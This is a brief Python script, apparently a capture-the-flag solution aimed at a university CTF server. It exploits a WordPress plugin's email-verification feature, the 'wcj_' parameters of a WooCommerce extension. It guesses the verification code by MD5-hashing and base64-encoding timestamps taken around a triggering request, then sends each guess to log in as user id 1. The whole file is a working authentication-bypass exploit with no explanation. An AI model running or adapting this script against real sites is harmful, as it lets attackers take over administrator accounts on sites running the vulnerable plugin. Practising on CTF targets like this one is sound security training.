import requests
import time
import hashlib
import base64
import json

ts1 = time.time()
ts2 = time.time()
ts3 = time.time()
ts4 = time.time()
r = requests.get("http://ctf-fsi.fe.up.pt:5001/?wcj_user_id=1")
ts5 = time.time()
ts6 = time.time()
ts7 = time.time()
ts8 = time.time()

ts_list = [ts1, ts2, ts3, ts4, ts5, ts6, ts7, ts8]

for ts in ts_list:
    ts_hash = hashlib.md5(str(ts).encode("utf-8")).hexdigest()
    base64_encoded = base64.b64encode(bytes(ts_hash, "utf-8"))
    clean_base64 = base64_encoded.decode("utf-8")[:-1]
    params = {"id": 1, "code": clean_base64}
    json_encode = json.dumps(params)
    req_string = f"http://ctf-fsi.fe.up.pt:5001/?wcj_verify_email={json_encode}"
    r2 = requests.get(req_string)
    print(r2)
    print(req_string)
    
    